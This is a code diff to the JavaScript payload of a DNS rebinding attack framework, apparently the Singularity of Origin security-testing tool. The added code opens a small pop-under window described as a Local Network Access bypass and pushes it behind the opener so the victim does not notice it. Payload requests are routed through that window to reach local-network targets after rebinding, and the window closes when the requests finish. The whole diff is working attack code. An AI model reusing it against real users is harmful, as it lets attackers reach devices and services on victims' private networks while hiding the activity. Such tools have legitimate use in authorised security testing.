@@ -26,6 +26,8 @@ const Rebinder = () => {
     let popupPollAttempts = 0;
     let popupNavigating = false;
     let popupRetryCount = 0;
+    let popupFetchPending = 0;
+    let popupCloseRequested = false;
     let rebindingStrategy = null;
 
     let payload = null;
@@ -198,8 +200,10 @@ const Rebinder = () => {
         b.setAttribute('id', 'popupOpenButton');
         b.innerText = 'Open popup for DNS rebinding attack (LNA bypass)';
         b.onclick = function () {
-            popupWin = window.open('about:blank', popupName, 'width=900,height=700');
+            popupWin = window.open('about:blank', popupName, popupWindowFeatures());
             if (popupWin) {
+                decorateSingularityPopup(popupWin);
+                sinkPopup(popupWin);
                 popupManagerMode = false;
                 b.remove();
                 startPopupAfterOpen();
@@ -388,7 +392,21 @@ const Rebinder = () => {
             // registered payloads run from the local address space.
             clearInterval(popupTimer);
             popupTimer = null;
-            sooFetch = (resource, options) => popupWin.fetch(resource, options);
+            // Count fetches issued from the popup so we can close it once
+            // rebinding has succeeded and the payload's requests have
+            // settled. Closing earlier would abort those requests.
+            sooFetch = (resource, options) => {
+                const pending = popupWin.fetch(resource, options);
+                popupFetchPending += 1;
+                const settled = () => {
+                    popupFetchPending -= 1;
+                    // Defer the check so a payload .then that starts the
+                    // next request runs before we decide the window is idle.
+                    queueMicrotask(closePopupIfIdle);
+                };
+                pending.then(settled, settled);
+                return pending;
+            };
             rebindingStatusEl.innerText = 'Popup navigated to target. Fetching via popup window...';
             let p = sooFetch(url, { credentials: 'omit' });
             p.then(
@@ -448,6 +466,29 @@ const Rebinder = () => {
             httpStatus: 0
         }, '*');
         rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
+        requestPopupClose();
+    }
+
+    // Ask the manager (which opened the placeholder) to close it, and try
+    // locally too for the fallback button path where this frame owns it.
+    // A page can only reliably close a window it opened itself.
+    function requestPopupClose() {
+        popupCloseRequested = true;
+        closePopupIfIdle();
+    }
+
+    function closePopupIfIdle() {
+        if (!popupCloseRequested || popupFetchPending > 0) {
+            return;
+        }
+        popupCloseRequested = false;
+        console.log('payload.js: DNS rebinding finished, closing popup');
+        try {
+            if (popupWin && !popupWin.closed) {
+                popupWin.close();
+            }
+        } catch (e) { /* the manager closes the window it opened */ }
+        window.parent.postMessage({ status: 'closePopup' }, '*');
     }
 
     function injectScript(frame) {
@@ -527,6 +568,9 @@ const Rebinder = () => {
                 rebindingSuccess = true;
                 rebindingStatusEl.innerText = `DNS rebinding successful! (HTTP ${responseData.status})`;
                 rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
+                if (popupWin) {
+                    requestPopupClose();
+                }
             })
             .catch(function (error) {
                 if (error instanceof TypeError) { // We cannot establish an HTTP connection
@@ -946,6 +990,55 @@ function httpHeaderstoText(headers) {
         out = (`${out}\n${pair[0]}: ${pair[1]}`);
     };
     return out;
+}
+
+// Same placeholder styling and pop-under behavior as manager.js, for the
+// fallback button in this frame (the manager's helpers are not in scope here).
+function popupWindowFeatures() {
+    const width = 380;
+    const height = 230;
+    const left = Math.max(0, (window.screen.availWidth || 0) - width - 24);
+    const top = Math.max(0, (window.screen.availHeight || 0) - height - 48);
+    return `width=${width},height=${height},left=${left},top=${top},` +
+        'menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=no';
+}
+
+function decorateSingularityPopup(popup) {
+    const html = `<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<title>Singularity of Origin</title>
+<style>
+  html, body { margin: 0; height: 100%; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; color: #212529; background: #fff; }
+  .jumbotron { padding: 1.1rem 1.25rem; margin: 0; background-color: #e9ecef; }
+  h1 { font-size: 1.35rem; font-weight: 400; line-height: 1.2; margin: 0 0 .35rem; }
+  .lead { margin: 0; font-size: 1rem; font-weight: 300; }
+  .note { margin: 0; padding: .9rem 1.25rem; font-size: .875rem; color: #6c757d; }
+</style></head>
+<body>
+  <div class="jumbotron">
+    <h1>Singularity of Origin</h1>
+    <p class="lead">DNS rebinding in progress.</p>
+  </div>
+  <p class="note">This window loads the target once DNS has rebound. Leave it in the background and don’t close it.</p>
+  <script>try { window.blur(); if (window.opener && !window.opener.closed) window.opener.focus(); } catch (e) {}</script>
+</body></html>`;
+    try {
+        const doc = popup.document;
+        doc.open();
+        doc.write(html);
+        doc.close();
+    } catch (e) { /* placeholder content is best-effort */ }
+}
+
+function sinkPopup(popup) {
+    const refocus = () => {
+        try { if (popup && !popup.closed) popup.blur(); } catch (e) {}
+        try { window.top.focus(); } catch (e) {}
+        try { window.focus(); } catch (e) {}
+    };
+    refocus();
+    setTimeout(refocus, 0);
 }
 
 let Registry = {};
